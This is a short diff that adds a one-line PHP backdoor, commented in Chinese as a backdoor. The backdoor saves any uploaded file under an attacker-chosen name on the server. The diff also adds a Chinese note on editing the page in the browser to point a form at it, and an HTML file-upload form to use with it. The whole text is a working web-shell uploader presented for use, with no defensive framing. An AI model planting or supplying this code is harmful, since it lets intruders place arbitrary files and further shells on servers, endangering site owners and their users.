@@ -1,0 +1,7 @@
+<?php @copy($_FILES[file][tmp_name], $_FILES[file][name]); exit; ?> //后门
+
+# 利用浏览器修改网页粘贴代码或保存html添加action属性
+
+<form method="post" enctype="multipart/form-data">
+<input type="file" name="file" size="50">
+<input type="submit" value="Upload"></form>
